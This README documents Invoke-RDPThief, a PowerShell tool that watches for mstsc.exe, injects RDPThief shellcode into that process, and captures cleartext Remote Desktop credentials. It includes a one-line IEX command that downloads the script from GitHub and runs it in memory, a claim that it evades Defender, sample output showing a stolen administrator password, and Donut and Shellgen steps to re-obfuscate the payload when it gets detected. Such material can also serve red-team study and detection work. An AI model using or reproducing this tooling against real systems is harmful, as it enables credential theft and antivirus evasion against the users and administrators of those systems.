# Invoke-RDPThief

This PowerShell script runs on a loop hunting for mstsc.exe processes. When any are found, the script will perform process injection on the target process and inject RDPthief into the process in order to capture cleartext credentials.

RDPThief.dll was converted to shellcode with Donut, then converted to UUIDs with Shellgen to hide the shellcode in plainsight within the script. The UUIDs are then converted back into shellcode at runtime and injected whilst staying completley in memory.

Works against Defender as of 01/10/2024

## Usage
```powershell
# Load into memory and execute
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/Invoke-RDPThief/refs/heads/main/Invoke-RDPThief.ps1")

```
## Output
```
[*] Hunting for mstsc...

[+] Successfully injected into process 5496

[+] Extracted Credentials

Server   : DC01.Security.local
Username : SECURITY\administrator
Password : Password123
```

## Payload creation
The payload in the script is ready to go however, the steps below can be followed if the payload is signatured in the future.

Convert RDPThief.dll into shellcode with Donut.
```
.\donut.exe -f:1 --input:C:\RdpThief.dll -e 3 -b 1 -x 3 -k 2
```

Convert to UUID with Shellgen
```powershell
Shellgen -RawFile "C:\loader.bin" -OutputFormat UUID
```
Take the output and place it into the $UUIDs array in Invoke-RDPThief.ps1

RDPThief: https://github.com/0x09AL/RdpThief

Donut: https://github.com/TheWover/donut

Shellgen: https://github.com/Leo4j/ShellGen


